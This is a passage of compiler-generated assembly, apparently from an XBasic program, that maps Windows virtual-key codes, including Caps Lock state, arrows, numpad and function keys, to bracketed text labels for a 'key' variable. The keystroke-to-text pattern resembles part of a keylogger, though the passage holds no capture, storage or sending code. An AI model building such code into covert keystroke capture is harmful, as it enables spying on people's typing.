	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1151] CASE $$VK_CAPITAL		:IF GetKeyStatus($$VK_CAPITAL) THEN
	jmp	end.select.0062.server			;;; i69
case.0062.000D.server:
	mov	eax,20			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.000E.server			;;; i71
	push	20			;;; i656a
	call	func5C.server			;;; i619
	test	eax,eax			;;; i220
	jz	>> else.0063.server			;;; i221
;
; [1152] key = "[CAPSLOCK ON]"' is now on
	mov	eax,addr @_string.022B.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1153] ELSE
	jmp	end.if.0063.server			;;; i107
else.0063.server:
;
; [1154] key = "[CAPSLOCK OFF]"' is now off
	mov	eax,addr @_string.022C.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1155] END IF
end.if.0063.server:
;
; [1156] CASE $$VK_ESCAPE		:key = "[ESCAPE]"
	jmp	end.select.0062.server			;;; i69
case.0062.000E.server:
	mov	eax,27			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.000F.server			;;; i71
	mov	eax,addr @_string.022E.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1157] CASE $$VK_SPACE			:key = " "
	jmp	end.select.0062.server			;;; i69
case.0062.000F.server:
	mov	eax,32			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0010.server			;;; i71
	mov	eax,addr @_string.0230.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1158] CASE $$VK_PRIOR			:key = "[PGUP]"'"[PRIOR]"
	jmp	end.select.0062.server			;;; i69
case.0062.0010.server:
	mov	eax,33			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0011.server			;;; i71
	mov	eax,addr @_string.0232.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1159] CASE $$VK_NEXT			:key = "[PGDN]"'"[NEXT]"
	jmp	end.select.0062.server			;;; i69
case.0062.0011.server:
	mov	eax,34			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0012.server			;;; i71
	mov	eax,addr @_string.0234.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1160] CASE $$VK_END			:key = "[END]"
	jmp	end.select.0062.server			;;; i69
case.0062.0012.server:
	mov	eax,35			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0013.server			;;; i71
	mov	eax,addr @_string.0236.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1161] CASE $$VK_HOME			:key = "[HOME]"
	jmp	end.select.0062.server			;;; i69
case.0062.0013.server:
	mov	eax,36			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0014.server			;;; i71
	mov	eax,addr @_string.0238.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1162] CASE $$VK_LEFT			:key = "[LEFT]"
	jmp	end.select.0062.server			;;; i69
case.0062.0014.server:
	mov	eax,37			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0015.server			;;; i71
	mov	eax,addr @_string.023A.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1163] CASE $$VK_UP			:key = "[UP]"
	jmp	end.select.0062.server			;;; i69
case.0062.0015.server:
	mov	eax,38			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0016.server			;;; i71
	mov	eax,addr @_string.023C.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1164] CASE $$VK_RIGHT			:key = "[RIGHT]"
	jmp	end.select.0062.server			;;; i69
case.0062.0016.server:
	mov	eax,39			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0017.server			;;; i71
	mov	eax,addr @_string.023E.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1165] CASE $$VK_DOWN			:key = "[DOWN]"
	jmp	end.select.0062.server			;;; i69
case.0062.0017.server:
	mov	eax,40			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0018.server			;;; i71
	mov	eax,addr @_string.0240.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1166] CASE $$VK_SELECT		:key = "[SELECT]"
	jmp	end.select.0062.server			;;; i69
case.0062.0018.server:
	mov	eax,41			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0019.server			;;; i71
	mov	eax,addr @_string.0242.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1167] CASE $$VK_PRINT			:key = "[PRINT]"
	jmp	end.select.0062.server			;;; i69
case.0062.0019.server:
	mov	eax,42			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.001A.server			;;; i71
	mov	eax,addr @_string.0244.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1168] CASE $$VK_EXECUTE		:key = "[EXECUTE]"
	jmp	end.select.0062.server			;;; i69
case.0062.001A.server:
	mov	eax,43			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.001B.server			;;; i71
	mov	eax,addr @_string.0246.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1169] CASE $$VK_SNAPSHOT		:key = "[SNAPSHOT]"
	jmp	end.select.0062.server			;;; i69
case.0062.001B.server:
	mov	eax,44			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.001C.server			;;; i71
	mov	eax,addr @_string.0248.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1170] CASE $$VK_INSERT		:key = "[INSERT]"
	jmp	end.select.0062.server			;;; i69
case.0062.001C.server:
	mov	eax,45			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.001D.server			;;; i71
	mov	eax,addr @_string.024A.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1171] CASE $$VK_DELETE		:key = "[DELETE]"
	jmp	end.select.0062.server			;;; i69
case.0062.001D.server:
	mov	eax,46			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.001E.server			;;; i71
	mov	eax,addr @_string.024C.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1172] CASE $$VK_HELP			:key = "[HELP]"
	jmp	end.select.0062.server			;;; i69
case.0062.001E.server:
	mov	eax,47			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.001F.server			;;; i71
	mov	eax,addr @_string.024E.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1173] CASE $$VK_NUMPAD0		:key = "[NUMPAD 0]"
	jmp	end.select.0062.server			;;; i69
case.0062.001F.server:
	mov	eax,96			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0020.server			;;; i71
	mov	eax,addr @_string.0250.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1174] CASE $$VK_NUMPAD1		:key = "[NUMPAD 1]"
	jmp	end.select.0062.server			;;; i69
case.0062.0020.server:
	mov	eax,97			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0021.server			;;; i71
	mov	eax,addr @_string.0252.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1175] CASE $$VK_NUMPAD2		:key = "[NUMPAD 2]"
	jmp	end.select.0062.server			;;; i69
case.0062.0021.server:
	mov	eax,98			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0022.server			;;; i71
	mov	eax,addr @_string.0254.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1176] CASE $$VK_NUMPAD3		:key = "[NUMPAD 3]"
	jmp	end.select.0062.server			;;; i69
case.0062.0022.server:
	mov	eax,99			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0023.server			;;; i71
	mov	eax,addr @_string.0256.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1177] CASE $$VK_NUMPAD4		:key = "[NUMPAD 4]"
	jmp	end.select.0062.server			;;; i69
case.0062.0023.server:
	mov	eax,100			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0024.server			;;; i71
	mov	eax,addr @_string.0258.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1178] CASE $$VK_NUMPAD5		:key = "[NUMPAD 5]"
	jmp	end.select.0062.server			;;; i69
case.0062.0024.server:
	mov	eax,101			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0025.server			;;; i71
	mov	eax,addr @_string.025A.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1179] CASE $$VK_NUMPAD6		:key = "[NUMPAD 6]"
	jmp	end.select.0062.server			;;; i69
case.0062.0025.server:
	mov	eax,102			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0026.server			;;; i71
	mov	eax,addr @_string.025C.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1180] CASE $$VK_NUMPAD7		:key = "[NUMPAD 7]"
	jmp	end.select.0062.server			;;; i69
case.0062.0026.server:
	mov	eax,103			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0027.server			;;; i71
	mov	eax,addr @_string.025E.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1181] CASE $$VK_NUMPAD8		:key = "[NUMPAD 8]"
	jmp	end.select.0062.server			;;; i69
case.0062.0027.server:
	mov	eax,104			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0028.server			;;; i71
	mov	eax,addr @_string.0260.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1182] CASE $$VK_NUMPAD9		:key = "[NUMPAD 9]"
	jmp	end.select.0062.server			;;; i69
case.0062.0028.server:
	mov	eax,105			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0029.server			;;; i71
	mov	eax,addr @_string.0262.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1183] CASE $$VK_MULTIPLY		:key = "[*]"
	jmp	end.select.0062.server			;;; i69
case.0062.0029.server:
	mov	eax,106			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.002A.server			;;; i71
	mov	eax,addr @_string.0264.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1184] CASE $$VK_ADD			:key = "[+]"
	jmp	end.select.0062.server			;;; i69
case.0062.002A.server:
	mov	eax,107			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.002B.server			;;; i71
	mov	eax,addr @_string.0266.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1185] CASE $$VK_SEPARATOR		:key = "[SEPARATOR]"
	jmp	end.select.0062.server			;;; i69
case.0062.002B.server:
	mov	eax,108			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.002C.server			;;; i71
	mov	eax,addr @_string.0268.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1186] CASE $$VK_SUBTRACT		:key = "[-]"
	jmp	end.select.0062.server			;;; i69
case.0062.002C.server:
	mov	eax,109			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.002D.server			;;; i71
	mov	eax,addr @_string.026A.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1187] CASE $$VK_DECIMAL		:key = "[.]"
	jmp	end.select.0062.server			;;; i69
case.0062.002D.server:
	mov	eax,110			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.002E.server			;;; i71
	mov	eax,addr @_string.026C.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1188] CASE $$VK_DIVIDE		:key = "[/]"
	jmp	end.select.0062.server			;;; i69
case.0062.002E.server:
	mov	eax,111			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.002F.server			;;; i71
	mov	eax,addr @_string.026E.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1189] CASE $$VK_F1			:key = "[F1]"
	jmp	end.select.0062.server			;;; i69
case.0062.002F.server:
	mov	eax,112			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0030.server			;;; i71
	mov	eax,addr @_string.0270.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1190] CASE $$VK_F2			:key = "[F2]"
	jmp	end.select.0062.server			;;; i69
case.0062.0030.server:
	mov	eax,113			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0031.server			;;; i71
	mov	eax,addr @_string.0272.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1191] CASE $$VK_F3			:key = "[F3]"
	jmp	end.select.0062.server			;;; i69
case.0062.0031.server:
	mov	eax,114			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0032.server			;;; i71
	mov	eax,addr @_string.0274.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1192] CASE $$VK_F4			:key = "[F4]"
	jmp	end.select.0062.server			;;; i69
case.0062.0032.server:
	mov	eax,115			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0033.server			;;; i71
	mov	eax,addr @_string.0276.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1193] CASE $$VK_F5			:key = "[F5]"
	jmp	end.select.0062.server			;;; i69
case.0062.0033.server:
	mov	eax,116			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0034.server			;;; i71
	mov	eax,addr @_string.0278.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1194] CASE $$VK_F6			:key = "[F6]"
	jmp	end.select.0062.server			;;; i69
case.0062.0034.server:
	mov	eax,117			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0035.server			;;; i71
	mov	eax,addr @_string.027A.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1195] CASE $$VK_F7			:key = "[F7]"
	jmp	end.select.0062.server			;;; i69
case.0062.0035.server:
	mov	eax,118			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0036.server			;;; i71
	mov	eax,addr @_string.027C.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1196] CASE $$VK_F8			:key = "[F8]"
	jmp	end.select.0062.server			;;; i69
case.0062.0036.server:
	mov	eax,119			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0037.server			;;; i71
	mov	eax,addr @_string.027E.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1197] CASE $$VK_F9			:key = "[F9]"
	jmp	end.select.0062.server			;;; i69
case.0062.0037.server:
	mov	eax,120			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0038.server			;;; i71
	mov	eax,addr @_string.0280.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1198] CASE $$VK_F10			:key = "[F10]"
	jmp	end.select.0062.server			;;; i69
case.0062.0038.server:
	mov	eax,121			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0039.server			;;; i71
	mov	eax,addr @_string.0282.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1199] CASE $$VK_F11			:key = "[F11]"
	jmp	end.select.0062.server			;;; i69
case.0062.0039.server:
	mov	eax,122			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.003A.server			;;; i71
	mov	eax,addr @_string.0284.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1200] CASE $$VK_F12			:key = "[F12]"
	jmp	end.select.0062.server			;;; i69
case.0062.003A.server:
	mov	eax,123			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.003B.server			;;; i71
	mov	eax,addr @_string.0286.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1201] CASE $$VK_F13			:key = "[F13]"
	jmp	end.select.0062.server			;;; i69
case.0062.003B.server:
	mov	eax,124			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.003C.server			;;; i71
	mov	eax,addr @_string.0288.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1202] CASE $$VK_F14			:key = "[F14]"
	jmp	end.select.0062.server			;;; i69
case.0062.003C.server:
	mov	eax,125			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.003D.server			;;; i71
	mov	eax,addr @_string.028A.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1203] CASE $$VK_F15			:key = "[F15]"
	jmp	end.select.0062.server			;;; i69
case.0062.003D.server:
	mov	eax,126			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.003E.server			;;; i71
	mov	eax,addr @_string.028C.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1204] CASE $$VK_F16			:key = "[F16]"
	jmp	end.select.0062.server			;;; i69
case.0062.003E.server:
	mov	eax,127			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.003F.server			;;; i71
	mov	eax,addr @_string.028E.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1205] CASE $$VK_F17			:key = "[F17]"
	jmp	end.select.0062.server			;;; i69
case.0062.003F.server:
	mov	eax,128			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0040.server			;;; i71
	mov	eax,addr @_string.0290.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1206] CASE $$VK_F18			:key = "[F18]"
	jmp	end.select.0062.server			;;; i69
case.0062.0040.server:
	mov	eax,129			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0041.server			;;; i71
	mov	eax,addr @_string.0292.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1207] CASE $$VK_F19			:key = "[F19]"
	jmp	end.select.0062.server			;;; i69
case.0062.0041.server:
	mov	eax,130			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0042.server			;;; i71
	mov	eax,addr @_string.0294.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1208] CASE $$VK_F20			:key = "[F20]"
	jmp	end.select.0062.server			;;; i69
case.0062.0042.server:
	mov	eax,131			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0043.server			;;; i71
	mov	eax,addr @_string.0296.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1209] CASE $$VK_F21			:key = "[F21]"
	jmp	end.select.0062.server			;;; i69
case.0062.0043.server:
	mov	eax,132			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0044.server			;;; i71
	mov	eax,addr @_string.0298.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1210] CASE $$VK_F22			:key = "[F22]"
	jmp	end.select.0062.server			;;; i69
case.0062.0044.server:
	mov	eax,133			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0045.server			;;; i71
	mov	eax,addr @_string.029A.server			;;; i663
